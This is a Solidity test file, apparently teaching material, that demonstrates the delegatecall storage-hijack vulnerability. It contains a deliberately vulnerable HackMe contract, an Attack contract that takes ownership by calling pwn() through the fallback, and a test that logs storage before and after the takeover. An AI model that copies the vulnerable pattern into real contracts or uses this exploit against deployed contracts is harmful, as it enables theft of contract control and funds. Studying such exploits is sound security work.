// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "template/ds_test_common.sol";

/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}

contract delegate_call_storage_exploit_Test is DSCommon {
    using SafeMath for uint256;

    // ----------------------------------------------------------------------------
    // Delegate Call Exploit #1 on Slot Storage
    // ----------------------------------------------------------------------------
    function test__delegate_call_1() public {
        Lib lib = new Lib();
        HackMe hackMe = new HackMe(lib);
        Attack attacker = new Attack(address(hackMe));

        emit log_named_address(
            "[Start] hackMe.owner",
            hackMe.owner()
        );

        dumpContinuousSlotData(address(hackMe), 0, 2);

        attacker.attack();

        emit log_named_address(
            "[End] hackMe.owner",
            hackMe.owner()
        );

        dumpContinuousSlotData(address(hackMe), 0, 2);
    }
}